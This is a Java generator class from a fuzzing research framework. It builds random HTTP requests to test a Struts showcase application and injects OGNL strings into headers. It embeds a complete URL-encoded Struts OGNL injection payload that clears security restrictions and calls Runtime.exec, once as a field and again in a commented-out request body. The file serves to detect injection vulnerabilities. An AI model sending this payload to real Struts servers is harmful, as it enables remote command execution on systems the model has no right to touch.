package edu.berkeley.cs.jqf.examples.http;

import com.pholser.junit.quickcheck.generator.GenerationStatus;
import com.pholser.junit.quickcheck.generator.Generator;
import com.pholser.junit.quickcheck.random.SourceOfRandomness;
import edu.berkeley.cs.jqf.examples.common.DictionaryBackedStringGenerator;
import org.apache.http.Header;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.client.methods.RequestBuilder;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;


public class StrutsRequestGenerator extends HTTPRequestGenerator {

    private final String bodyOGNLInjectionString = "%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D";

    //private  Generator<String> validBodyValues;
    private Generator<String> validUrlGenerator;
    private Generator<String> OGNLInjectionStrings;

    private Boolean OGNLInjectionDone;



    public StrutsRequestGenerator() {
        super();
        try {
            this.OGNLInjectionDone = false;
            this.validUrlGenerator =  new DictionaryBackedStringGenerator("dictionaries/struts-showcase-validUrls.dict", stringGenerator);
            this.OGNLInjectionStrings = new DictionaryBackedStringGenerator("dictionaries/struts-showcase-n-day-strings.dict", stringGenerator);
            // this.validBodyValues = new DictionaryBackedStringGenerator("dictionaries/tomcat-http-request.dict", stringGenerator);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    private Boolean decideIfInjectOGNL(SourceOfRandomness random) {
        Boolean result =  random.nextBoolean() &&  !this.OGNLInjectionDone;
        if(result) {
            this.OGNLInjectionDone = true;
        }
        return result;

    }

    private void getStrutsHeaders(RequestBuilder builder, SourceOfRandomness random, GenerationStatus status, String body) {


        Boolean injectOGNLInHeaders = random.nextBoolean();

        Set<String> staticHeaders = new HashSet<>();
        staticHeaders.add("Host");
        staticHeaders.add("Content-Type");
        staticHeaders.add("Content-Length");


        // Must have these headers to mke valid request
        builder.addHeader("Host", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) :"any");
        builder.addHeader("Content-Type", (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? this.OGNLInjectionStrings.generate(random, status) : "application/x-www-form-urlencoded");

        builder.addHeader("Content-Length", String.valueOf(body.length()));



        // Add more headers - make sure not to step over the ones we need
        int index = random.nextInt(max_elements);
        int i = 0;
        while(i< index) {
            String newHeader = makeString(random, status);
            if(!staticHeaders.contains(newHeader)) {
                builder.addHeader(newHeader, (injectOGNLInHeaders && this.decideIfInjectOGNL(random)) ? OGNLInjectionStrings.generate(random, status) :makeMultiLineString(random, status));
                i++;
            }
        }
    }

    @Override
    public String generate(SourceOfRandomness random, GenerationStatus status) {
        RequestBuilder builder = this.getReqType(random, status);
        String body = this.getBody();
        getStrutsHeaders(builder,random,status,body);

        // getParameters(builder,random,status);
        HttpUriRequest req =  builder.build();


        String request = req.toString() + "\r\n";

        Header[] headerFields = req.getAllHeaders();
        for (int i = 0; i < headerFields.length; i++) {
            request += (headerFields[i].getName() + ": " + headerFields[i].getValue() + "\r\n");
        }
        request += "\r\n";
        request += body;

        this.OGNLInjectionDone = false;
        return request;
    }

    @Override
    protected String getBody() {
        return "";//"name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
    }


    @Override
    protected RequestBuilder getReqType(SourceOfRandomness random, GenerationStatus status) {
        int index = random.nextInt(5);
        switch(index) {
            case 0:
                return RequestBuilder.get(this.validUrlGenerator.generate(random, status));
            case 1:
                return RequestBuilder.post(this.validUrlGenerator.generate(random, status));
            case 2:
                return RequestBuilder.head(this.validUrlGenerator.generate(random, status));
            case 3:
                return RequestBuilder.delete(this.validUrlGenerator.generate(random, status));
            case 4:
                return RequestBuilder.trace(this.validUrlGenerator.generate(random, status));
            // shouldn't get here
            default:
                return null;
        }
    }
}
